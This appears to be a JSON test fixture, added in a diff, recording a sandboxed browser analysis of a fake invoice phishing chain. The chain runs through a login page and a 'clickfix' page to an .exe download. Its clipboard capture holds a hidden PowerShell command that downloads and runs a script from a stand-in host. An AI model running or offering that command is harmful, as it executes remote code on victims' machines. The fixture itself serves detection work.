@@ -1,0 +1,278 @@
+{
+ "analysis_id": "an_fixture",
+ "url": "http://172.19.0.2:8000/index.html",
+ "interactive": false,
+ "profile": {
+  "name": "chrome-windows",
+  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
+  "locale": "en-US",
+  "timezone": "UTC",
+  "viewport": [
+   1366,
+   768
+  ]
+ },
+ "ended_at": "2026-10-10T04:38:26.231125+00:00",
+ "duration_ms": 12920,
+ "end_reason": "completed",
+ "final_url": "http://172.19.0.2:8000/download.html",
+ "title": "Invoice",
+ "redirects": [
+  {
+   "from": "http://172.19.0.2:8000/index.html",
+   "to": "http://172.19.0.2:8000/login.html",
+   "type": "meta_refresh",
+   "ms": 2435,
+   "page": "p0"
+  },
+  {
+   "from": "http://172.19.0.2:8000/login.html",
+   "to": "http://172.19.0.2:8000/clickfix.html",
+   "type": "js",
+   "ms": 3982,
+   "page": "p0"
+  },
+  {
+   "from": "http://172.19.0.2:8000/clickfix.html",
+   "to": "http://172.19.0.2:8000/download.html",
+   "type": "js",
+   "ms": 5521,
+   "page": "p0"
+  }
+ ],
+ "navigations": [
+  {
+   "page": "p0",
+   "url": "http://172.19.0.2:8000/index.html",
+   "ms": 1422
+  },
+  {
+   "page": "p0",
+   "url": "http://172.19.0.2:8000/login.html",
+   "ms": 2457
+  },
+  {
+   "page": "p0",
+   "url": "http://172.19.0.2:8000/clickfix.html",
+   "ms": 3997
+  },
+  {
+   "page": "p0",
+   "url": "http://172.19.0.2:8000/download.html",
+   "ms": 5544
+  }
+ ],
+ "pages": [
+  {
+   "id": "p0",
+   "url": "http://172.19.0.2:8000/download.html",
+   "frames": [
+    {
+     "url": "http://172.19.0.2:8000/download.html",
+     "title": "Invoice",
+     "forms": [],
+     "loose_password_fields": 0,
+     "links": [
+      "blob:http://172.19.0.2:8000/8011ec44-c82e-40eb-920d-34fd8b6e7a7e"
+     ],
+     "scripts": [
+      {
+       "sha256": "8bbd7c2e3f5a1b585daf8faf462a1744ca1b13e51f1071e2fdc84f9847dadf7b",
+       "inline": true
+      }
+     ],
+     "iframes": [],
+     "meta_refresh": [],
+     "favicon": null,
+     "text": "Your invoice is downloading.",
+     "name": "",
+     "parent_url": null
+    }
+   ],
+   "title": "Invoice"
+  },
+  {
+   "id": "p1",
+   "url": "http://172.19.0.2:8000/popup.html",
+   "frames": [
+    {
+     "url": "http://172.19.0.2:8000/popup.html",
+     "title": "Popup",
+     "forms": [],
+     "loose_password_fields": 0,
+     "links": [],
+     "scripts": [],
+     "iframes": [],
+     "meta_refresh": [],
+     "favicon": null,
+     "text": "Popup window fixture.",
+     "name": "",
+     "parent_url": null
+    }
+   ],
+   "title": "Popup"
+  }
+ ],
+ "tls": {},
+ "hosts": {
+  "172.19.0.2": [
+   "172.19.0.2"
+  ]
+ },
+ "blocked": [
+  {
+   "url": "http://10.1.2.3/",
+   "reason": "10.1.2.3 is a private address"
+  },
+  {
+   "url": "http://169.254.169.254/latest/meta-data/",
+   "reason": "169.254.169.254 is a link-local address (includes cloud metadata)"
+  }
+ ],
+ "downloads": [
+  {
+   "page": "p0",
+   "url": "blob:http://172.19.0.2:8000/8011ec44-c82e-40eb-920d-34fd8b6e7a7e",
+   "suggested_filename": "invoice_2026.exe",
+   "sha256": "f90a93fe2c2a8242314e95810a5590c3378aa795893999b885e9db677e1f8273",
+   "md5": "22162c7c744f6bc6a9b36406e2588d26",
+   "size": 32
+  }
+ ],
+ "dialogs": [],
+ "clipboard": [
+  {
+   "page": "p0",
+   "api": "document.execCommand(copy)",
+   "text": "powershell -w hidden -c \"iwr http://payload.example.invalid/x.ps1 | iex\""
+  }
+ ],
+ "console": [
+  {
+   "page": "p0",
+   "level": "log",
+   "text": "fixture-obfuscated"
+  },
+  {
+   "page": "p0",
+   "level": "error",
+   "text": "Failed to load resource: net::ERR_BLOCKED_BY_CLIENT.Inspector"
+  },
+  {
+   "page": "p0",
+   "level": "error",
+   "text": "Failed to load resource: net::ERR_BLOCKED_BY_CLIENT.Inspector"
+  }
+ ],
+ "screenshots": [
+  {
+   "file": "screenshots/000-load.png",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/index.html",
+   "page": "p0",
+   "ts": "2026-10-10T04:38:14.831457+00:00"
+  },
+  {
+   "file": "screenshots/001-load.png",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/login.html",
+   "page": "p0",
+   "ts": "2026-10-10T04:38:15.875964+00:00"
+  },
+  {
+   "file": "screenshots/002-load.png",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/popup.html",
+   "page": "p1",
+   "ts": "2026-10-10T04:38:15.945687+00:00"
+  },
+  {
+   "file": "screenshots/003-load.png",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/clickfix.html",
+   "page": "p0",
+   "ts": "2026-10-10T04:38:17.424024+00:00"
+  },
+  {
+   "file": "screenshots/004-load.png",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/download.html",
+   "page": "p0",
+   "ts": "2026-10-10T04:38:18.939289+00:00"
+  },
+  {
+   "file": "screenshots/005-interval.png",
+   "reason": "interval",
+   "url": "http://172.19.0.2:8000/popup.html",
+   "page": "p1",
+   "ts": "2026-10-10T04:38:19.777398+00:00"
+  },
+  {
+   "file": "screenshots/006-interval.png",
+   "reason": "interval",
+   "url": "http://172.19.0.2:8000/popup.html",
+   "page": "p1",
+   "ts": "2026-10-10T04:38:24.838138+00:00"
+  },
+  {
+   "file": "screenshots/007-final-fullpage.png",
+   "reason": "final-fullpage",
+   "url": "http://172.19.0.2:8000/download.html",
+   "page": "p0",
+   "ts": "2026-10-10T04:38:25.374181+00:00"
+  }
+ ],
+ "dom_snapshots": [
+  {
+   "file": "dom/000.html",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/index.html",
+   "page": "p0"
+  },
+  {
+   "file": "dom/001.html",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/login.html",
+   "page": "p0"
+  },
+  {
+   "file": "dom/002.html",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/popup.html",
+   "page": "p1"
+  },
+  {
+   "file": "dom/003.html",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/clickfix.html",
+   "page": "p0"
+  },
+  {
+   "file": "dom/004.html",
+   "reason": "load",
+   "url": "http://172.19.0.2:8000/download.html",
+   "page": "p0"
+  },
+  {
+   "file": "dom/005.html",
+   "reason": "final",
+   "url": "http://172.19.0.2:8000/download.html",
+   "page": "p0"
+  },
+  {
+   "file": "dom/006.html",
+   "reason": "final",
+   "url": "http://172.19.0.2:8000/popup.html",
+   "page": "p1"
+  }
+ ],
+ "scripts": [
+  {
+   "sha256": "8bbd7c2e3f5a1b585daf8faf462a1744ca1b13e51f1071e2fdc84f9847dadf7b",
+   "size": 345,
+   "urls": []
+  }
+ ],
+ "errors": [],
+ "event_count": 34
+}
